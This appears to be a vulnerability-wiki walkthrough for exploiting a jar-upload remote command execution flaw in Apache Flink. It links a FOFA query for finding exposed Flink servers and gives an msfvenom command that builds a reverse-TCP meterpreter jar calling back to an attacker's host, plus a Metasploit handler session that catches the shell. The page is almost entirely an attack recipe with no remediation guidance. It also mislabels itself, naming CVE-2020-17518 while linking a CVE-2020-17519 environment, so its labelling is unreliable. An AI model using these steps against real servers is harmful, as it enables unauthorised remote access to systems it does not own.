---
title: Apache Flink upload Remote command execution vulnerability CVE-2020-17518
---

# Apache Flink upload Remote command execution vulnerability CVE-2020-17518

## Vulnerability Description

Recently, a security researcher disclosed a vulnerability in the upload of any Jar package of Apache Flink that causes remote code execution. The attacker can obtain system permissions through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Apache Flink <= 1.9.1</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">
<a-button href="https://fofa.info/result?qbase64=YXBwPSJBcGFjaGUgRmxpbmsi">FOFA: app="Apache Flink"</a-button>
</a-checkbox>

## Environment construction

<a-alert type="success" message="https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519" description="" showIcon>
</a-alert>

</br>

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/06d235d4-965d-44e0-91c0-dc69b97bf48d.png)

## Vulnerability reappears

Click to view the file upload page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/bb05ef9f-f86f-4bb5-bbcb-c13424d7aca4.png)

Open MSF to generate a jar Trojan

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx  LPORT=4444 -f jar > test.jar
```

Click Add to upload the jar file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1fcaa45f-0492-4411-b14f-e4554cf84e5b.png)

```shell
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp
payload => java/shell/reverse_tcp
msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx
lhost => xxx.xxx.xxx.xxx
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/3def5e8c-6590-4ecd-8b61-dfcb095bdaa0.png)

Click submit

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/681f48a7-3501-4f52-8532-5efddcc0074f.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/16969b72-8db4-42f8-a0e3-b02022ab5f5b.png)